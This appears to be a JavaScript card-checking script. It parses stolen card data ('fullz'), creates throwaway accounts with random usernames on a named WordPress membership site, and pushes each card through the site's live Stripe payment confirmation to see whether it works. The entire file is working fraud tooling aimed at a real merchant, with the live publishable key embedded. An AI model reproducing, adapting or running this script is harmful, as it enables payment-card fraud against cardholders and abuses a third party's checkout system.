
import axios from 'axios';

async function findBetween(data, first, last) {
  try {
    const start = data.indexOf(first) + first.length;
    const end = data.indexOf(last, start);
    return data.substring(start, end);
  } catch (error) {
    return null;
  }
}

function generateUsername(length = 14) {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

async function checks(fullz, session) {
  const [cc, mes, ano, cvv] = fullz.split('|');
  const headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryUGyMQew65A6I2vzx',
    'Origin': 'https://edhatwp.managedcoder.com',
    'Referer': 'https://edhatwp.managedcoder.com/register/monthly-subscription/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
  };

  const files = {
    'mepr_process_signup_form': 'Y',
    'mepr_product_id': '5874',
    'user_first_name': 'And',
    'user_last_name': 'smm',
    'mepr_membership': 'individual',
    'mepr_community': 'new-haven',
    'mepr_discovery': 'another-website',
    'mepr-geo-country': '',
    'user_login': generateUsername(),
    'user_email': `${generateUsername()}@eurokool.com`,
    'mepr_user_password': '123@Password',
    'mepr_user_password_confirm': '123@Password',
    'mepr_coupon_code': '',
    'mepr_payment_method': 'rjbtub-6ku',
    'mepr_no_val': '',
  };

  const response = await session.post(
    'https://edhatwp.managedcoder.com/register/monthly-subscription/',
    headers,
    files
  );
  const trans = await findBetween(response.data, 'name="mepr_transaction_id" value="', '"');

  const headers2 = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryn9TwQrUWfqFDz43m',
    'Origin': 'https://edhatwp.managedcoder.com',
    'Referer': 'https://edhatwp.managedcoder.com/register/monthly-subscription/?action=checkout&txn=c',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'cache-control': 'no-cache',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
  };

  const files2 = {
    'mepr_transaction_id': trans,
    'address_required': '0',
    'card-first-name': 'And',
    'card-last-name': 'smm',
    'action': 'mepr_stripe_confirm_payment',
    'mepr_current_url': 'https://edhatwp.managedcoder.com/register/monthly-subscription/?action=checkout&txn=c#mepr_jump',
  };

  const response2 = await session.post('https://edhatwp.managedcoder.com/wp-admin/admin-ajax.php', headers2, files2);
  const clientSecret = response2.data.client_secret;
  const returnUrl = response2.data.return_url;
  const pi = await findBetween(response2.data, '"client_secret":"', '_secret');

  const headers3 = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  };

  const data = {
    'return_url': returnUrl,
    'payment_method_data[billing_details][address][country]': 'IN',
    'payment_method_data[billing_details][email]': 'ultrahostbypremium@eurokool.com',
    'payment_method_data[billing_details][name]': 'And smm',
    'payment_method_data[type]': 'card',
    'payment_method_data[card][number]': cc,
    'payment_method_data[card][cvc]': cvv,
    'payment_method_data[card][exp_year]': ano,
    'payment_method_data[card][exp_month]': mes,
    'payment_method_data[allow_redisplay]': 'unspecified',
    'payment_method_data[pasted_fields]': 'number',
    'payment_method_data[payment_user_agent]': 'stripe.js/327b5a4b1f; stripe-js-v3/327b5a4b1f; payment-element; deferred-intent',
    'payment_method_data[referrer]': 'https://edhatwp.managedcoder.com',
    'payment_method_data[time_on_page]': '199709',
    'payment_method_data[client_attribution_metadata][client_session_id]': 'dc7fb132-472f-4a34-bfdf-2bf85d16403b',
    'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element',
    'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021',
    'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'deferred',
    'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'merchant_specified',
    'payment_method_data[guid]': '64e7174c-3327-4b4e-bf99-eaa640855c6b62118c',
    'payment_method_data[muid]': '50c6cb6a-a42a-428b-b809-35834b24939bae3f1c',
    'payment_method_data[sid]': 'ef3c07d9-bc8b-4b53-9573-2344299615a1b8e757',
    'expected_payment_method_type': 'card',
    'client_context[currency]': 'usd',
    'client_context[mode]': 'subscription',
    'client_context[payment_method_types][0]': 'card',
    'client_context[payment_method_types][1]': 'link',
    'client_context[setup_future_usage]': 'off_session',
    'use_stripe_sdk': 'false',
    'key': 'pk_live_51BQ4AaKbla2hzrCr2kTCMd79erEBupAvq8uM4iCRJwwbo8JkNFxmCgT55JA0k4jJSWSEqZzDb6DtKobdmgsx9rBw008dqO8ZjO',
    '_stripe_version': '2022-11-15',
    'client_secret': clientSecret,
  };

  const response3 = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi}/confirm`, data, { headers: headers3 });
  console.log(response3.data);
  return response3;
}

